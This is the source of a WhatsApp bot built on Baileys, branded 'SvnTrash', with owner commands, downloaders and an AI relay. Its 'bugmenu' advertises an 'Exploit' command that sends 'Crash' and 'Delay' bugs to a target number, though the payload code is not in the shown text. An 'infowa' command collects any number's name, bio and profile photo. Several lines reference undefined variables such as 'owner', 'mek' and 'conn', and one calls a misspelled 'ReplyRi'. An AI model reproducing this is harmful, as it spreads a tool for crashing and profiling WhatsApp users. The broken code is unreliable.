//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('./setting/config')
//END
//INSTALLING BAILEYS
const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");   
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");
//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ril = async (Ril, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END


//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./System/x1')

//END

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ril.decodeJid(Ril.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ril.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''

const Rilyzy = fs.readFileSync(`./System/thumb.png`)

if (!Ril.public) {
if (!CreatorOnly) return
}
//- #FizzX8 -\\
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`# New Message`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//FUNCTION 

// end
const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: Rilyzy, 
					itemCount: `9999999`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `#-2025 ( #FizzX8 )`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
const ThumbUrl = "https://files.catbox.moe/gut2cp.jpg"

const ReplyRil = (teks) => {
  return Ril.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: [m.chat],
        forwardingScore: 99999999,
        isForwarded: true,
        externalAdReply: {
          title: "#-2025 ( #FizzX8 )",
          body: "© #FizzX8",
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          thumbnailUrl: "https://files.catbox.moe/gut2cp.jpg",
          sourceUrl: "https://t.me/FizzNescafe"
        }
      }
    },
    { quoted: zets }
  );
};

//END

//END 
const menu = fs.readFileSync(`./System/menu.jpg`)
const bug = fs.readFileSync(`./System/bug.jpeg`)		
const succes = fs.readFileSync(`./System/SpecX.jpg`)
//END

const usedram = ((os.totalmem() - os.freemem()) / 1024 / 1024 / 1024).toFixed(2) + ' GB';
const virtuals_type = "Ubuntu 24.04 LTS";
const RunTime = `${runtime(process.uptime())}`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
let all = `
  --( We For Svn )--
-
⬡ *Author*: *#FizzX8*
⬡ *Prefix*: *Multi*
⬡ *Type*: *ComonJS*
-

© 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 
`;
const MenuX = {
    interactiveMessage: {
      title: all,
      image: menu,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 97410,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "- We For Svn - Trash",
                    newsletterJid: "120363309802495518@newsletter"
                }
            },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "- SvnTrash -",
                        url: "https://t.me/FizzNescafe",
                        copy_code: "(⚠️) - UpMarkDown !!",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 0,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "---( 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )---",
                        button_title: "---( We For FizzX8 )---"
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "=",
                            sections: [
                                {
                                    title: "- SvnTrash -",
                                    rows: [
                                        { header: "- SvnTrash -", title: "FunMenu", id: `.funmenu` },
                                        { header: "- SvnTrash -", title: "BugMenu ⚡", id: `.bugmenu` },
                                        { header: "- SvnTrash -", title: "OwnerMenu 🔧", id: `.ownermenu` }
                                    ]
                                }
                            ]
                        })
                    }
                ]
            }
        }
    };

    await Ril.sendMessage(m.chat, MenuX, { quoted: zets });
}
break; 




//ALL MENU CASE {
case 'ownermenu': {
let all = `
  --( We For Svn )--
-
⬡ *Author*: *#FizzX8*
⬡ *Prefix*: *Multi*
⬡ *Type*: *ComonJS*
-

┌──────
├─── ▢ ( We For Owner )
┠─ ▢ !
├─ - Addowner 
├─ - Delowner
├─ - Addprem
├─ - Delprem
├─ - Self/Public
└
`;
const MenuX = {
    interactiveMessage: {
     title: all,
      image: menu,
      contextInfo: {
          isForwarded: true,
          forwardingScore: 97410,
          forwardedNewsletterMessageInfo: {
         newsletterName: "- We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 888",
         newsletterJid: "120363309802495518@newsletter"
       }
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "- SvnTrash -",
            url: "https://t.me/FizzCover",
            copy_code: "(⚠️) - UpMarkDown !!",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 0,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "---( We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )---",
            button_title: "---( We For FizzX8 )---"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "#FizzX8",
              url: "https://t.me/FizzNescafe",
              landing_page_url: "https://t.me/FizzNescafe",
              webview_interaction: true,
              payment_link_preview: false,
              webview_presentation: null              
            })
          }
        ]
      }
    }
  };

  await Ril.sendMessage(m.chat, MenuX, { quoted: zets });
}
break 


//ALL MENU CASE {
case 'funmenu': {
let all = `
  --( We For Svn )--
-
⬡ *Author*: *#FizzX8*
⬡ *Prefix*: *Multi*
⬡ *Type*: *ComonJS*
-

┌──────
├─── ▢ ( We For Feature )
┠─ ▢ !
├─ - Play
├─ - Tiktok
├─ - Ig/Instagram
├─ - Cekidch
├─ - Gethtml
├─ - Hidetag
├─ - Infowa
├─ - Ai
├─ - Iqc
├─ - reactch
└
`;
const MenuX = {
    interactiveMessage: {
     title: all,
      image: menu,
      contextInfo: {
          isForwarded: true,
          forwardingScore: 97410,
          forwardedNewsletterMessageInfo: {
         newsletterName: "- We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 888",
         newsletterJid: "120363309802495518@newsletter"
       }
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "- SvnTrash -",
            url: "https://t.me/FizzCover",
            copy_code: "(⚠️) - UpMarkDown !!",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 0,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "---( We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )---",
            button_title: "---( We For FizzX8 )---"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "#FizzX8",
              url: "https://t.me/FizzNescafe",
              landing_page_url: "https://t.me/FizzNescafe",
              webview_interaction: true,
              payment_link_preview: false,
              webview_presentation: null              
            })
          }
        ]
      }
    }
  };

  await Ril.sendMessage(m.chat, MenuX, { quoted: zets });
}
break 




//ALL MENU CASE {
case 'bugmenu': {
let all = `
  --( We For Svn )--
-
⬡ *Author*: *#FizzX8*
⬡ *Prefix*: *Multi*
⬡ *Type*: *ComonJS*
-

┌──────
├─── ▢ ( We For Bugs )
┠─ ▢ !
├─ - Exploit 6288xxx
├─ - Bug Type :
├─ - └‣ Crash
├─ - └‣ Delay
└
`;
const MenuX = {
    interactiveMessage: {
     title: all,
      image: menu,
      contextInfo: {
          isForwarded: true,
          forwardingScore: 97410,
          forwardedNewsletterMessageInfo: {
         newsletterName: "- We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 888",
         newsletterJid: "120363309802495518@newsletter"
       }
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "- SvnTrash -",
            url: "https://t.me/FizzCover",
            copy_code: "(⚠️) - UpMarkDown !!",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 0,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "---( We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )---",
            button_title: "---( We For FizzX8 )---"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "#FizzX8",
              url: "https://t.me/FizzNescafe",
              landing_page_url: "https://t.me/FizzNescafe",
              webview_interaction: true,
              payment_link_preview: false,
              webview_presentation: null              
            })
          }
        ]
      }
    }
  };

  await Ril.sendMessage(m.chat, MenuX, { quoted: zets });
}
break 


// ---( We For #FizzX8 )--- \\
case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRil("*Your Not #FizzX8*")
  if (!args[0]) return ReplyRil(`Penggunaan : ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRil(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;

case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRil("*Your Not #FizzX8*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example:\n ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;

case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRil("*Your Not #FizzX8*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRil(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;

case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRil("*Your Not #FizzX8*")
  if (!args[0]) return ReplyRil(`Penggunaan ${prefix + command} Example ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
case 'hidetag': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRil("*This command can only be used in a group*");

  let message = q ? q : '';
  let mentionedUsers = participants.map(a => a.id);

  try {
    await Ril.sendMessage(from, { 
      text: message, 
      mentions: mentionedUsers 
    }, { quoted: zets });
  } catch (error) {
    console.error("Error sending message:", error);
    ReplyRil("An error occurred while sending the message.");
  }
}
break;

case 'tiktok': {
    if (!q) return ReplyRil(`*Syntax Error*\nExample: tiktok <link>`);

    try {
        let url = q.trim();
        let apiUrl = `https://www.laurine.site/api/downloader/tiktok?url=${encodeURIComponent(url)}`;
        let { data } = await axios.get(apiUrl);

        let videoUrl = data?.data?.no_watermark;
        if (!videoUrl) return ReplyRil(`❌ Gagal mengambil video.\nRespon API:\n${JSON.stringify(data, null, 2)}`);

        let caption = `🎬 *${data.data.title || 'TikTok Downloader'}*\n\n—© Copyright By #FizzX8`;

        await Ril.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: caption,
            mimetype: 'video/mp4'
        }, { quoted: zets });

    } catch (err) {
        console.error(err);
        ReplyRil('❌ Terjadi kesalahan server atau URL tidak valid.');
    }
}
break;
// Func React Ch 


async function reactToPost(postUrl, emojis) {
  let currentTokenIndex = 0;
  
  let attempts = 0;

  while (attempts < global.tokens.length) {

    const apiKey = global.tokens[currentTokenIndex];

    try {

      const response = await axios({

        method: 'POST',

        url: `https://foreign-marna-sithaunarathnapromax-9a005c2e.koyeb.app/api/channel/react-to-post?apiKey=${apiKey}`,

        headers: { 'content-type': 'application/json' },

        data: { post_link: postUrl, reacts: emojis }

      });

      return { success: true };

    } catch (e) {

      const msg = e.response?.data?.message || "";

      if (e.response?.status === 402 || msg.includes("limit") || msg.includes("Limit")) {

        currentTokenIndex = (currentTokenIndex + 1) % global.tokens.length;

        attempts++;

        continue;

      }

      return { success: false };

    }

  }

  return { success: false };

}
case 'reactch': {
    if (!q) return ReplyRil(`Example:\n${command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍`)
    const [postUrl, emojiString] = q.split(' ', 2)

    if (!postUrl || !emojiString) {
        return ReplyRil(`Example:\n${command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍`)
    }

    const emojis = [...emojiString.matchAll(/\p{Extended_Pictographic}/gu)].map(e => e[0])

    if (!postUrl.startsWith('https://whatsapp.com/channel/')) {
        return ReplyRil(`Example:\n${command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍`)
    }

    const parts = postUrl.split('/')
    const postId = parts.at(-1)

    if (!postId || isNaN(postId)) {
        return ReplyRil(`❌ Link salah, itu link channel.\n*Harus link post!*`)
    }

    ReplyRil('⏳ Processing ReactCh..')

    try {
        const res = await reactToPost(postUrl, emojis)

        if (res.success) {
            const result = {
                BotName: "𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 Bot",
                emoji: emojis.join(','),
                target: postUrl,
                status: "Successfully Reaction",
                copyright: "© Copyright By #FizzX8"
            }

            return ReplyRil("```" + JSON.stringify(result, null, 2) + "```")
        } else {
            return ReplyRil(`❌ Gagal mengirim react`)
        }

    } catch (err) {
        return ReplyRil(
            '❌ Error saat mengirim react\n\n' +
            (err?.response?.data?.message || err?.message || err)
        )
    }
}
break
case 'ig': case 'instagram': {
    if (!q) return ReplyRil(`*Syntax Error*\nExample: ig <link Instagram>`);

    let msg = await Ril.sendMessage(m.chat, { text: '⏳ Downloading video...' }, { quoted: zets });

    try {
        let apiUrl = `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(q)}`;
        let { data } = await axios.get(apiUrl);

        if (!data.status || !Array.isArray(data.data) || data.data.length === 0)
            return ReplyRil('❌ Gagal mengambil video. Cek link-nya ya.');

        let video = data.data[0];
        let caption = `🎬 *Instagram Downloader*\n📸 ${video.filename || 'Video hasil unduhan'}\n\n—© Copyright By #FizzX8`;

        await Ril.sendMessage(m.chat, {
            video: { url: video.url },
            caption: caption,
            mimetype: 'video/mp4'
        }, { quoted: zets });

        await Ril.sendMessage(m.chat, { delete: msg.key });

    } catch (err) {
        console.error(err);
        ReplyRil('❌ Terjadi kesalahan server atau video tidak dapat diunduh.');
    }
}
break;
case 'cekidch': {
    if (!qtext) return ReplyRil("❗ Sertakan link saluran");
    if (!qtext.includes("https://whatsapp.com/channel/")) return ReplyRil("❗ Link tautan tidak valid");

    let result = qtext.split('https://whatsapp.com/channel/')[1];
    let res = await Ril.newsletterMetadata("invite", result);

    let teks = `- *ID : ${res.id}*
- *Nama :* ${res.name}
- *Total Pengikut :* ${res.subscribers}
- *Status :* ${res.state}
- *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`;

    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: teks
                    },
                    footer: {
                        text: `           ---( We For #FizzX8 )---`
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: `{"display_text": "Copy ID","copy_code": "${res.id}"}`
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: zets });

    await Ril.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case 'gethtml': {
    if (!args[0]) return ReplyRil('❌ Syntax Error\nExample: gethtml https://hahaha.com');

    const url = args[0].startsWith('http') ? args[0] : 'https://' + args[0];
    const msg = await ReplyRil('⏳ Wait...');

    try {
        const apiUrl = `https://api.nekolabs.web.id/tools/rjina?url=${encodeURIComponent(url)}&format=html`;
        const response = await axios.get(apiUrl);
        const htmlData = response.data.result || response.data;

        const filePath = './index.html';
        fs.writeFileSync(filePath, htmlData, 'utf-8');

        await Ril.sendMessage(from, {
            document: { url: filePath },
            fileName: 'index.html',
            mimetype: 'text/html'
        });

        fs.unlinkSync(filePath);
        await Ril.sendMessage(from, { delete: msg.key });
    } catch (e) {
        console.error(e);
        ReplyRi('❌ Failed to fetch HTML.');
    }
    break;
}
case 'play': {
    if (!q) return ReplyRil(`*Example:* play <judul lagu>`);

    try {
        let judul = encodeURIComponent(q);
        let apiUrl = `https://api.nekolabs.web.id/downloader/spotify/play/v1?q=${judul}`;
        let { data } = await axios.get(apiUrl);

        if (!data.success) return ReplyRil('*Lagu tidak ditemukan!*');

        let result = data.result;
        let meta = result.metadata;
        let audioUrl = result.downloadUrl;

        let caption = `🎵 *Spotify Play*\n\n` +
                      `• Title: ${meta.title}\n` +
                      `• Artist: ${meta.artist}\n` +
                      `• Duration: ${meta.duration}\n` +
                      `• URL: ${meta.url}`;
        await Ril.sendMessage(m.chat, { 
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${meta.title}.mp3`,
            caption: caption
        }, { quoted: zets });

    } catch (err) {
        console.error(err);
        ReplyRil('*Terjadi kesalahan saat mengambil lagu!*');
    }
}
break;
case 'infowa': {
    if (!q) return ReplyRil(`*Syntax Error*\nExample:\n${command} 628xxxx`);

    const nomor = q.replace(/[^0-9]/g, '');
    const jid = nomor + '@s.whatsapp.net';

    try {
        const wa = await Ril.onWhatsApp(nomor).catch(() => null);
        const data = wa?.[0];

        if (!data || !data.exists) {
            return Ril.sendMessage(
                m.chat,
                { text: `❌ Nomor +${nomor} *TIDAK TERDAFTAR* di WhatsApp.` },
                { quoted: zets }
            );
        }

        let nama = "Tidak tersedia";
        try {
            const v = await Ril.onWhatsApp(jid).catch(() => null);
            nama = v?.[0]?.notify || v?.[0]?.name || nama;
        } catch {}

        let bioObj = { status: "Tidak ada bio", setAt: null };
        try {
            const fetched = await Ril.fetchStatus(jid).catch(() => null);
            if (fetched && typeof fetched === 'object') bioObj = fetched;
        } catch {}

        let waktuBio = '-';
        try {
            const setAt = bioObj?.setAt;
            const timeNum = setAt ? Number(setAt) : NaN;
            if (!Number.isNaN(timeNum) && timeNum > 0) {
                waktuBio = new Date(timeNum).toLocaleString('id-ID', {
                    timeZone: 'Asia/Jakarta',
                    hour12: false
                }) + " WIB";
            }
        } catch {
            waktuBio = '-';
        }

        let pp = "Tidak Ada Foto Profil";
        try {
            const p = await Ril.profilePictureUrl(jid, 'image').catch(() => null);
            if (p) pp = p;
        } catch {}

        const tipe = data?.status === 'business' ? 'Business Account' : 'Personal Account';

        const output = {
            Bot: "GetX4Su Checker Bot",
            nama,
            nomor: `+${nomor}`,
            exists: true,
            tipe,
            lid: data?.lid || null,
            businessInfo: data?.businessInfo || null,
            bio: typeof bioObj?.status === 'string' ? bioObj.status : "Tidak ada bio",
            bioUpdated: waktuBio,
            photoProfile: pp,
            copyright: "© Copyright By #FizzX8"
        };

        const teks = '```\n' + JSON.stringify(output, null, 2) + '\n```';

        await Ril.sendMessage(
            m.chat,
            { text: teks },
            { quoted: zets }
        );

    } catch (e) {
        await Ril.sendMessage(
            m.chat,
            { text: `❌ Terjadi kesalahan.\nError: ${String(e)}` },
            { quoted: zets }
        );
    }
}
break;
case 'iqc': {
    if (!q) return ReplyRil(`*Syntax Error*\nExample: ${command} #FizzX8`);

    try {
        await ReplyRil('⏳ *Sedang memproses IQ Check...*');

        const res = await fetch(`https://api-faa.my.id/faa/iqc?prompt=${encodeURIComponent(q)}`);
        if (!res.ok) throw new Error(`HTTP Error ${res.status}`);

        const contentType = res.headers.get('content-type') || '';

        if (contentType.includes('application/json')) {
            const data = await res.json();
            const hasil = data?.result || data?.message || "Gagal mengambil hasil IQC.";
            await conn.sendMessage(from, { text: `*IQC Result*\n\n${hasil}\n\n© Copyright By #FizzX8` }, { quoted: zets });
        } else {
            const arrayBuffer = await res.arrayBuffer();
            const buffer = Buffer.from(arrayBuffer);

            await Ril.sendMessage(from, { image: buffer, caption: "✅ IQC Result" }, { quoted: zets });
        }

    } catch (err) {
        ReplyRil(`❌ *IQC Error*\n${String(err)}`);
    }
}
break;
case 'ai': {
    if (!q) return ReplyRil(`*Syntax Error*\nExample:\n${command} Hari ini hari apa`);

    const txt = encodeURIComponent(q);
    const url = `https://api-faa.my.id/faa/ai-realtime?text=${txt}`;

    try {
        await Ril.sendPresenceUpdate('composing', m.chat);

        const res = await fetch(url).then(v => v.json());

        if (!res || !res.result) {
            return ReplyRil(`❌ Gagal mendapatkan respon dari AI.`);
        }

        const ai = res.result;

        return Ril.sendMessage(
            m.chat,
            { text: `🤖 *GetX4Su*:\n\n${ai}` },
            { quoted: zets }
        );

    } catch (e) {
        return ReplyRil(`❌ Terjadi kesalahan.\nError: ${String(e)}`);
    }
}
break;
// ---( End Feature )--- \\
case 'public': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = true;
  ReplyRil(`*Success: Changed Mode from Self to Public*`);
}
break;

case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = false;
